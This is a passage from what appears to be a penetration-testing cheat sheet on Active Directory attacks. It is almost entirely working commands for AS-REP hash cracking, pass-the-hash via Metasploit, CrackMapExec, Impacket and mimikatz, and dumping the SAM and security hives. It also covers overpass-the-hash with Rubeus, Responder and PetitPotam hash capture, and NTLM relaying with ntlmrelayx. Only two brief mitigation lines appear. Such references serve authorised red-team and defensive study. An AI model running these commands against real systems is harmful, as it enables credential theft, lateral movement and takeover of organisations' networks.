<a id="__codelineno-155-3" name="__codelineno-155-3" href="#__codelineno-155-3"></a><span class="n">root</span><span class="nv">@windows</span><span class="p">:</span><span class="n">hashcat</span><span class="p">$</span> <span class="n">hashcat64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-m</span> <span class="n">18200</span> <span class="s1">&#39;&lt;AS_REP-hash&gt;&#39;</span> <span class="n">-a</span> <span class="n">0</span> <span class="n">c</span><span class="p">:\</span><span class="n">wordlists</span><span class="p">\</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-155-4" name="__codelineno-155-4" href="#__codelineno-155-4"></a>
<a id="__codelineno-155-5" name="__codelineno-155-5" href="#__codelineno-155-5"></a><span class="c"># crack AS_REP messages with john</span>
<a id="__codelineno-155-6" name="__codelineno-155-6" href="#__codelineno-155-6"></a><span class="n">C</span><span class="p">:\</span><span class="n">Rubeus</span><span class="p">&gt;</span> <span class="n">john</span> <span class="p">-</span><span class="n">-format</span><span class="p">=</span><span class="n">krb5asrep</span> <span class="p">-</span><span class="n">-wordlist</span><span class="p">=</span><span class="n">passwords_kerb</span><span class="p">.</span><span class="n">txt</span> <span class="n">hashes</span><span class="p">.</span><span class="n">asreproast</span>
</code></pre></div>
<p><strong>Mitigations</strong>: 
* All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).</p>
<h2 id="pass-the-hash">Pass-the-Hash</h2>
<p>The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.</p>
<ul>
<li>Metasploit
  <div class="highlight"><pre><span></span><code><a id="__codelineno-156-1" name="__codelineno-156-1" href="#__codelineno-156-1"></a><span class="n">use</span> <span class="n">exploit</span><span class="p">/</span><span class="n">windows</span><span class="p">/</span><span class="n">smb</span><span class="p">/</span><span class="n">psexec</span>
<a id="__codelineno-156-2" name="__codelineno-156-2" href="#__codelineno-156-2"></a><span class="nb">set </span><span class="n">RHOST</span> <span class="n">10</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">3</span>
<a id="__codelineno-156-3" name="__codelineno-156-3" href="#__codelineno-156-3"></a><span class="nb">set </span><span class="n">SMBUser</span> <span class="n">jarrieta</span>
<a id="__codelineno-156-4" name="__codelineno-156-4" href="#__codelineno-156-4"></a><span class="nb">set </span><span class="n">SMBPass</span> <span class="n">nastyCutt3r</span>  
<a id="__codelineno-156-5" name="__codelineno-156-5" href="#__codelineno-156-5"></a><span class="c"># NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.</span>
<a id="__codelineno-156-6" name="__codelineno-156-6" href="#__codelineno-156-6"></a><span class="c"># NOTE2: Require the full NT hash, you may need to add the &quot;blank&quot; LM (aad3b435b51404eeaad3b435b51404ee)</span>
<a id="__codelineno-156-7" name="__codelineno-156-7" href="#__codelineno-156-7"></a><span class="nb">set </span><span class="n">PAYLOAD</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">bind_tcp</span>
<a id="__codelineno-156-8" name="__codelineno-156-8" href="#__codelineno-156-8"></a><span class="n">run</span>
<a id="__codelineno-156-9" name="__codelineno-156-9" href="#__codelineno-156-9"></a><span class="n">shell</span>
</code></pre></div></li>
<li>CrackMapExec
  <div class="highlight"><pre><span></span><code><a id="__codelineno-157-1" name="__codelineno-157-1" href="#__codelineno-157-1"></a><span class="n">cme</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">/</span><span class="n">24</span> <span class="n">-u</span> <span class="n">jarrieta</span> <span class="n">-H</span> <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d&#39;</span> <span class="n">-x</span> <span class="s2">&quot;whoami&quot;</span>
</code></pre></div></li>
<li>Impacket suite
  <div class="highlight"><pre><span></span><code><a id="__codelineno-158-1" name="__codelineno-158-1" href="#__codelineno-158-1"></a><span class="n">proxychains</span> <span class="n">python</span> <span class="p">./</span><span class="n">psexec</span><span class="p">.</span><span class="n">py</span> <span class="n">jarrieta</span><span class="nv">@10</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="n">-hashes</span> <span class="p">:</span><span class="n">489a04c09a5debbc9b975356693e179d</span>
</code></pre></div></li>
<li>Windows RDP and mimikatz
  <div class="highlight"><pre><span></span><code><a id="__codelineno-159-1" name="__codelineno-159-1" href="#__codelineno-159-1"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">contoso</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ntlm</span><span class="p">:</span><span class="n">b73fdfe10e87b4ca5c0d957f81de6863</span>
<a id="__codelineno-159-2" name="__codelineno-159-2" href="#__codelineno-159-2"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">user</span> <span class="n">name</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">domain</span> <span class="n">name</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ntlm</span><span class="p">:&lt;</span><span class="n">the</span> <span class="n">users</span> <span class="n">ntlm</span> <span class="n">hash</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">run</span><span class="p">:</span><span class="s2">&quot;mstsc.exe /restrictedadmin&quot;</span>
</code></pre></div></li>
</ul>
<p>You can extract the local <strong>SAM database</strong> to find the local administrator hash :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-160-1" name="__codelineno-160-1" href="#__codelineno-160-1"></a><span class="n">C</span><span class="p">:\&gt;</span> <span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">sam</span> <span class="n">c</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">sam</span><span class="p">.</span><span class="n">save</span>
<a id="__codelineno-160-2" name="__codelineno-160-2" href="#__codelineno-160-2"></a><span class="n">C</span><span class="p">:\&gt;</span> <span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">security</span> <span class="n">c</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">security</span><span class="p">.</span><span class="n">save</span>
<a id="__codelineno-160-3" name="__codelineno-160-3" href="#__codelineno-160-3"></a><span class="n">C</span><span class="p">:\&gt;</span> <span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">system</span> <span class="n">c</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">system</span><span class="p">.</span><span class="n">save</span>
<a id="__codelineno-160-4" name="__codelineno-160-4" href="#__codelineno-160-4"></a><span class="p">$</span> <span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">-sam</span> <span class="n">sam</span><span class="p">.</span><span class="n">save</span> <span class="n">-security</span> <span class="n">security</span><span class="p">.</span><span class="n">save</span> <span class="n">-system</span> <span class="n">system</span><span class="p">.</span><span class="n">save</span> <span class="n">LOCAL</span>
</code></pre></div>
<h2 id="overpass-the-hash-pass-the-key">OverPass-the-Hash (pass the key)</h2>
<p>In this technique, instead of passing the hash directly, we use the NT hash of an account to request a valid Kerberost ticket (TGT).</p>
<h3 id="using-impacket">Using impacket</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-161-1" name="__codelineno-161-1" href="#__codelineno-161-1"></a>root@kali:~$<span class="w"> </span>python<span class="w"> </span>./getTGT.py<span class="w"> </span>-hashes<span class="w"> </span><span class="s2">&quot;:1a59bd44fe5bec39c44c8cd3524dee&quot;</span><span class="w"> </span>lab.ropnop.com
<a id="__codelineno-161-2" name="__codelineno-161-2" href="#__codelineno-161-2"></a>root@kali:~$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s2">&quot;/root/impacket-examples/velociraptor.ccache&quot;</span>
<a id="__codelineno-161-3" name="__codelineno-161-3" href="#__codelineno-161-3"></a>root@kali:~$<span class="w"> </span>python3<span class="w"> </span>psexec.py<span class="w"> </span><span class="s2">&quot;jurassic.park/velociraptor@labwws02.jurassic.park&quot;</span><span class="w"> </span>-k<span class="w"> </span>-no-pass
<a id="__codelineno-161-4" name="__codelineno-161-4" href="#__codelineno-161-4"></a>
<a id="__codelineno-161-5" name="__codelineno-161-5" href="#__codelineno-161-5"></a><span class="c1"># also with the AES Key if you have it</span>
<a id="__codelineno-161-6" name="__codelineno-161-6" href="#__codelineno-161-6"></a>root@kali:~$<span class="w"> </span>./getTGT.py<span class="w"> </span>-aesKey<span class="w"> </span>xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx<span class="w"> </span>lab.ropnop.com
<a id="__codelineno-161-7" name="__codelineno-161-7" href="#__codelineno-161-7"></a>
<a id="__codelineno-161-8" name="__codelineno-161-8" href="#__codelineno-161-8"></a>root@kali:~$<span class="w"> </span>ktutil<span class="w"> </span>-k<span class="w"> </span>~/mykeys<span class="w"> </span>add<span class="w"> </span>-p<span class="w"> </span>tgwynn@LAB.ROPNOP.COM<span class="w"> </span>-e<span class="w"> </span>arcfour-hma-md5<span class="w"> </span>-w<span class="w"> </span>1a59bd44fe5bec39c44c8cd3524dee<span class="w"> </span>--hex<span class="w"> </span>-V<span class="w"> </span><span class="m">5</span>
<a id="__codelineno-161-9" name="__codelineno-161-9" href="#__codelineno-161-9"></a>root@kali:~$<span class="w"> </span>kinit<span class="w"> </span>-t<span class="w"> </span>~/mykers<span class="w"> </span>tgwynn@LAB.ROPNOP.COM
<a id="__codelineno-161-10" name="__codelineno-161-10" href="#__codelineno-161-10"></a>root@kali:~$<span class="w"> </span>klist
</code></pre></div>
<h3 id="using-rubeus">Using Rubeus</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-162-1" name="__codelineno-162-1" href="#__codelineno-162-1"></a><span class="c"># Request a TGT as the target user and pass it into the current session</span>
<a id="__codelineno-162-2" name="__codelineno-162-2" href="#__codelineno-162-2"></a><span class="c"># NOTE: Make sure to clear tickets in the current session (with &#39;klist purge&#39;) to ensure you don&#39;t have multiple active TGTs</span>
<a id="__codelineno-162-3" name="__codelineno-162-3" href="#__codelineno-162-3"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="no">[NTLMHASH]</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-162-4" name="__codelineno-162-4" href="#__codelineno-162-4"></a>
<a id="__codelineno-162-5" name="__codelineno-162-5" href="#__codelineno-162-5"></a><span class="c"># More stealthy variant, but requires the AES256 hash</span>
<a id="__codelineno-162-6" name="__codelineno-162-6" href="#__codelineno-162-6"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">aes256</span><span class="p">:</span><span class="no">[AES256HASH]</span> <span class="p">/</span><span class="n">opsec</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-162-7" name="__codelineno-162-7" href="#__codelineno-162-7"></a>
<a id="__codelineno-162-8" name="__codelineno-162-8" href="#__codelineno-162-8"></a><span class="c"># Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)</span>
<a id="__codelineno-162-9" name="__codelineno-162-9" href="#__codelineno-162-9"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="no">[NTLMHASH]</span> <span class="p">/</span><span class="n">createnetonly</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>
</code></pre></div>
<h2 id="capturing-and-cracking-net-ntlmv1ntlmv1-hashes">Capturing and cracking Net-NTLMv1/NTLMv1 hashes</h2>
<blockquote>
<p>Net-NTLM (NTLMv1) hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user's NT hash. </p>
</blockquote>
<p><img alt="ℹ" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/2139.svg" title=":information_source:" /> : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to <strong>NetNTLMv1 Challenge/Response authentication</strong>. This uses the outdated encryption method DES to protect the NT/LM Hashes.</p>
<p><strong>Requirements</strong>:
* LmCompatibilityLevel = 0x1: Send LM &amp; NTLM (<code>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel</code>)</p>
<p><strong>Exploitation</strong>:
* Capturing using Responder: Edit the <code>/etc/responder/Responder.conf</code> file to include the magical <strong>1122334455667788</strong> challenge
    <div class="highlight"><pre><span></span><code><a id="__codelineno-163-1" name="__codelineno-163-1" href="#__codelineno-163-1"></a><span class="n">HTTPS</span> <span class="p">=</span> <span class="n">On</span>
<a id="__codelineno-163-2" name="__codelineno-163-2" href="#__codelineno-163-2"></a><span class="n">DNS</span> <span class="p">=</span> <span class="n">On</span>
<a id="__codelineno-163-3" name="__codelineno-163-3" href="#__codelineno-163-3"></a><span class="n">LDAP</span> <span class="p">=</span> <span class="n">On</span>
<a id="__codelineno-163-4" name="__codelineno-163-4" href="#__codelineno-163-4"></a><span class="p">...</span>
<a id="__codelineno-163-5" name="__codelineno-163-5" href="#__codelineno-163-5"></a><span class="p">;</span> <span class="n">Custom</span> <span class="n">challenge</span><span class="p">.</span>
<a id="__codelineno-163-6" name="__codelineno-163-6" href="#__codelineno-163-6"></a><span class="p">;</span> <span class="n">Use</span> <span class="s2">&quot;Random&quot;</span> <span class="k">for</span> <span class="n">generating</span> <span class="n">a</span> <span class="n">random</span> <span class="n">challenge</span> <span class="k">for</span> <span class="n">each</span> <span class="n">requests</span> <span class="p">(</span><span class="k">Default</span><span class="p">)</span>
<a id="__codelineno-163-7" name="__codelineno-163-7" href="#__codelineno-163-7"></a><span class="n">Challenge</span> <span class="p">=</span> <span class="n">1122334455667788</span>
</code></pre></div>
* Fire Responder: <code>responder -I eth0 --lm</code>, if <code>--disable-ess</code> is set, extended session security will be disabled for NTLMv1 authentication
* Force a callback:
    <div class="highlight"><pre><span></span><code><a id="__codelineno-164-1" name="__codelineno-164-1" href="#__codelineno-164-1"></a><span class="n">PetitPotam</span><span class="p">.</span><span class="n">exe</span> <span class="n">Responder-IP</span> <span class="n">DC-IP</span> <span class="c"># Patched around August 2021</span>
<a id="__codelineno-164-2" name="__codelineno-164-2" href="#__codelineno-164-2"></a><span class="n">PetitPotam</span><span class="p">.</span><span class="n">py</span> <span class="n">-u</span> <span class="n">Username</span> <span class="n">-p</span> <span class="n">Password</span> <span class="n">-d</span> <span class="n">Domain</span> <span class="n">-dc-ip</span> <span class="n">DC-IP</span> <span class="n">Responder-IP</span> <span class="n">DC-IP</span> <span class="c"># Not patched for authenticated users</span>
</code></pre></div>
* If you got some <code>NTLMv1 hashes</code>, you need to format them to submit them on <a href="https://crack.sh/netntlm/">crack.sh</a>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-165-1" name="__codelineno-165-1" href="#__codelineno-165-1"></a><span class="n">username</span><span class="p">::</span><span class="n">hostname</span><span class="p">:</span><span class="n">response</span><span class="p">:</span><span class="n">response</span><span class="p">:</span><span class="n">challenge</span> <span class="p">-&gt;</span> <span class="n">NTHASH</span><span class="p">:</span><span class="n">response</span>
<a id="__codelineno-165-2" name="__codelineno-165-2" href="#__codelineno-165-2"></a><span class="n">NTHASH</span><span class="p">:</span><span class="n">F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972</span>
</code></pre></div>
* Or crack them with Hashcat / John The Ripper
    <div class="highlight"><pre><span></span><code><a id="__codelineno-166-1" name="__codelineno-166-1" href="#__codelineno-166-1"></a><span class="n">john</span> <span class="p">-</span><span class="n">-format</span><span class="p">=</span><span class="n">netntlm</span> <span class="n">hash</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-166-2" name="__codelineno-166-2" href="#__codelineno-166-2"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">5500</span> <span class="n">-a</span> <span class="n">3</span> <span class="n">hash</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
* Now you can DCSync using the Pass-The-Hash with the DC machine account</p>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> NTLMv1 with SSP(Security Support Provider) changes the server challenge and is not quite ideal for the attack, but it can be used.</p>
<p><strong>Mitigations</strong>: </p>
<ul>
<li>Set the Lan Manager authentication level to <code>Send NTLMv2 responses only. Refuse LM &amp; NTLM</code></li>
</ul>
<h2 id="capturing-and-cracking-net-ntlmv2ntlmv2-hashes">Capturing and cracking Net-NTLMv2/NTLMv2 hashes</h2>
<p>If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison <code>LLMNR</code>, <code>MDNS</code> and <code>NETBIOS</code> requests on the network.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-167-1" name="__codelineno-167-1" href="#__codelineno-167-1"></a><span class="c"># https://github.com/lgandx/Responder</span>
<a id="__codelineno-167-2" name="__codelineno-167-2" href="#__codelineno-167-2"></a><span class="p">$</span> <span class="n">sudo</span> <span class="p">./</span><span class="n">Responder</span><span class="p">.</span><span class="n">py</span> <span class="n">-I</span> <span class="n">eth0</span> <span class="n">-wfrd</span> <span class="n">-P</span> <span class="n">-v</span>
<a id="__codelineno-167-3" name="__codelineno-167-3" href="#__codelineno-167-3"></a>
<a id="__codelineno-167-4" name="__codelineno-167-4" href="#__codelineno-167-4"></a><span class="c"># https://github.com/Kevin-Robertson/InveighZero</span>
<a id="__codelineno-167-5" name="__codelineno-167-5" href="#__codelineno-167-5"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">inveighzero</span><span class="p">.</span><span class="n">exe</span> <span class="n">-FileOutput</span> <span class="n">Y</span> <span class="n">-NBNS</span> <span class="n">Y</span> <span class="n">-mDNS</span> <span class="n">Y</span> <span class="n">-Proxy</span> <span class="n">Y</span> <span class="n">-MachineAccounts</span> <span class="n">Y</span> <span class="n">-DHCPv6</span> <span class="n">Y</span> <span class="n">-LLMNRv6</span> <span class="n">Y</span> <span class="p">[</span><span class="n">-Elevated</span> <span class="n">N</span><span class="p">]</span>
<a id="__codelineno-167-6" name="__codelineno-167-6" href="#__codelineno-167-6"></a>
<a id="__codelineno-167-7" name="__codelineno-167-7" href="#__codelineno-167-7"></a><span class="c"># https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1</span>
<a id="__codelineno-167-8" name="__codelineno-167-8" href="#__codelineno-167-8"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Invoke-Inveigh</span> <span class="p">[</span><span class="n">-IP</span> <span class="s1">&#39;10.10.10.10&#39;</span><span class="p">]</span> <span class="n">-ConsoleOutput</span> <span class="n">Y</span> <span class="n">-FileOutput</span> <span class="n">Y</span> <span class="n">-NBNS</span> <span class="n">Y</span> <span class="err">–</span><span class="n">mDNS</span> <span class="n">Y</span> <span class="err">–</span><span class="n">Proxy</span> <span class="n">Y</span> <span class="n">-MachineAccounts</span> <span class="n">Y</span>
</code></pre></div>
<p>Crack the hashes with Hashcat / John The Ripper</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-168-1" name="__codelineno-168-1" href="#__codelineno-168-1"></a><span class="n">john</span> <span class="p">-</span><span class="n">-format</span><span class="p">=</span><span class="n">netntlmv2</span> <span class="n">hash</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-168-2" name="__codelineno-168-2" href="#__codelineno-168-2"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">5600</span> <span class="n">-a</span> <span class="n">3</span> <span class="n">hash</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
<h2 id="man-in-the-middle-attacks-relaying">Man-in-the-Middle attacks &amp; relaying</h2>
<p>NTLMv1 and NTLMv2 can be relayed to connect to another machine.</p>
<table>
<thead>
<tr>
<th>Hash</th>
<th>Hashcat</th>
<th>Attack method</th>
</tr>
</thead>
<tbody>
<tr>
<td>LM</td>
<td><code>3000</code></td>
<td>crack/pass the hash</td>
</tr>
<tr>
<td>NTLM/NTHash</td>
<td><code>1000</code></td>
<td>crack/pass the hash</td>
</tr>
<tr>
<td>NTLMv1/Net-NTLMv1</td>
<td><code>5500</code></td>
<td>crack/relay attack</td>
</tr>
<tr>
<td>NTLMv2/Net-NTLMv2</td>
<td><code>5600</code></td>
<td>crack/relay attack</td>
</tr>
</tbody>
</table>
<p>Crack the hash with <code>hashcat</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-169-1" name="__codelineno-169-1" href="#__codelineno-169-1"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">5600</span> <span class="n">-a</span> <span class="n">0</span> <span class="n">hash</span><span class="p">.</span><span class="n">txt</span> <span class="n">crackstation</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
<h3 id="ms08-068-ntlm-reflection">MS08-068 NTLM reflection</h3>
<p>NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.</p>
<blockquote>
<p>This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim’s own credentials.</p>
</blockquote>
<ul>
<li>https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-170-1" name="__codelineno-170-1" href="#__codelineno-170-1"></a><span class="n">msf</span> <span class="p">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="p">/</span><span class="n">windows</span><span class="p">/</span><span class="n">smb</span><span class="p">/</span><span class="n">smb_relay</span>
<a id="__codelineno-170-2" name="__codelineno-170-2" href="#__codelineno-170-2"></a><span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">smb_relay</span><span class="p">)</span> <span class="p">&gt;</span> <span class="n">show</span> <span class="n">targets</span>
</code></pre></div>
<h3 id="smb-signing-disabled-and-ipv4">SMB Signing Disabled and IPv4</h3>
<p>If a machine has <code>SMB signing</code>:<code>disabled</code>, it is possible to use Responder with Multirelay.py script to perform an <code>NTLMv2 hashes relay</code> and get a shell access on the machine. Also called <strong>LLMNR/NBNS Poisoning</strong></p>
<ol>
<li>Open the Responder.conf file and set the value of <code>SMB</code> and <code>HTTP</code> to <code>Off</code>.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-171-1" name="__codelineno-171-1" href="#__codelineno-171-1"></a><span class="no">[Responder Core]</span>
<a id="__codelineno-171-2" name="__codelineno-171-2" href="#__codelineno-171-2"></a><span class="p">;</span> <span class="n">Servers</span> <span class="n">to</span> <span class="nb">start</span>
<a id="__codelineno-171-3" name="__codelineno-171-3" href="#__codelineno-171-3"></a><span class="p">...</span>
<a id="__codelineno-171-4" name="__codelineno-171-4" href="#__codelineno-171-4"></a><span class="n">SMB</span> <span class="p">=</span> <span class="n">Off</span>     <span class="c"># Turn this off</span>
<a id="__codelineno-171-5" name="__codelineno-171-5" href="#__codelineno-171-5"></a><span class="n">HTTP</span> <span class="p">=</span> <span class="n">Off</span>    <span class="c"># Turn this off</span>
</code></pre></div></li>
<li>Run <code>python  RunFinger.py -i IP_Range</code> to detect machine with <code>SMB signing</code>:<code>disabled</code>.</li>
<li>Run <code>python Responder.py -I &lt;interface_card&gt;</code> </li>
<li>Use a relay tool such as <code>ntlmrelayx</code> or <code>MultiRelay</code><ul>
<li><code>impacket-ntlmrelayx -tf targets.txt</code> to dump the SAM database of the targets in the list. </li>
<li><code>python MultiRelay.py -t &lt;target_machine_IP&gt; -u ALL</code></li>
</ul>
</li>
<li>ntlmrelayx can also act as a SOCK proxy with every compromised sessions.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-172-1" name="__codelineno-172-1" href="#__codelineno-172-1"></a><span class="p">$</span> <span class="n">impacket-ntlmrelayx</span> <span class="n">-tf</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">targets</span><span class="p">.</span><span class="n">txt</span> <span class="n">-socks</span> <span class="n">-smb2support</span>
<a id="__codelineno-172-2" name="__codelineno-172-2" href="#__codelineno-172-2"></a><span class="p">[*]</span> <span class="n">Servers</span> <span class="n">started</span><span class="p">,</span> <span class="n">waiting</span> <span class="k">for</span> <span class="n">connections</span>
<a id="__codelineno-172-3" name="__codelineno-172-3" href="#__codelineno-172-3"></a><span class="nb">Type </span><span class="n">help</span> <span class="k">for</span> <span class="n">list</span> <span class="n">of</span> <span class="n">commands</span>
<a id="__codelineno-172-4" name="__codelineno-172-4" href="#__codelineno-172-4"></a><span class="n">ntlmrelayx</span><span class="p">&gt;</span> <span class="n">socks</span>
<a id="__codelineno-172-5" name="__codelineno-172-5" href="#__codelineno-172-5"></a><span class="n">Protocol</span>  <span class="n">Target</span>          <span class="n">Username</span>                  <span class="n">Port</span>
<a id="__codelineno-172-6" name="__codelineno-172-6" href="#__codelineno-172-6"></a><span class="p">--------</span>  <span class="p">--------------</span>  <span class="p">------------------------</span>  <span class="p">----</span>
<a id="__codelineno-172-7" name="__codelineno-172-7" href="#__codelineno-172-7"></a><span class="n">MSSQL</span>     <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">48</span><span class="p">.</span><span class="n">230</span>  <span class="n">VULNERABLE</span><span class="p">/</span><span class="n">ADMINISTRATOR</span>  <span class="n">1433</span>
<a id="__codelineno-172-8" name="__codelineno-172-8" href="#__codelineno-172-8"></a><span class="n">SMB</span>       <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">48</span><span class="p">.</span><span class="n">230</span>  <span class="n">CONTOSO</span><span class="p">/</span><span class="n">NORMALUSER1</span>       <span class="n">445</span>
<a id="__codelineno-172-9" name="__codelineno-172-9" href="#__codelineno-172-9"></a><span class="n">MSSQL</span>     <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">48</span><span class="p">.</span><span class="n">230</span>  <span class="n">CONTOSO</span><span class="p">/</span><span class="n">NORMALUSER1</span>       <span class="n">1433</span>
<a id="__codelineno-172-10" name="__codelineno-172-10" href="#__codelineno-172-10"></a>
<a id="__codelineno-172-11" name="__codelineno-172-11" href="#__codelineno-172-11"></a><span class="c"># You might need to select a target with &quot;-t&quot;</span>
<a id="__codelineno-172-12" name="__codelineno-172-12" href="#__codelineno-172-12"></a><span class="c"># smb://, mssql://, http://, https://, imap://, imaps://, ldap://, ldaps:// and smtp://</span>
<a id="__codelineno-172-13" name="__codelineno-172-13" href="#__codelineno-172-13"></a><span class="n">impacket-ntlmrelayx</span> <span class="n">-t</span> <span class="n">mssql</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-socks</span> <span class="n">-smb2support</span>
<a id="__codelineno-172-14" name="__codelineno-172-14" href="#__codelineno-172-14"></a><span class="n">impacket-ntlmrelayx</span> <span class="n">-t</span> <span class="n">smb</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-socks</span> <span class="n">-smb2support</span>
<a id="__codelineno-172-15" name="__codelineno-172-15" href="#__codelineno-172-15"></a>
<a id="__codelineno-172-16" name="__codelineno-172-16" href="#__codelineno-172-16"></a><span class="c"># the socks proxy can then be used with your Impacket tools or CrackMapExec</span>
<a id="__codelineno-172-17" name="__codelineno-172-17" href="#__codelineno-172-17"></a><span class="p">$</span> <span class="n">proxychains</span> <span class="n">impacket-smbclient</span> <span class="p">//</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">48</span><span class="p">.</span><span class="n">230</span><span class="p">/</span><span class="n">Users</span> <span class="n">-U</span> <span class="n">contoso</span><span class="p">/</span><span class="n">normaluser1</span>
<a id="__codelineno-172-18" name="__codelineno-172-18" href="#__codelineno-172-18"></a><span class="p">$</span> <span class="n">proxychains</span> <span class="n">impacket-mssqlclient</span> <span class="n">DOMAIN</span><span class="p">/</span><span class="n">USER</span><span class="nv">@10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-windows-auth</span>
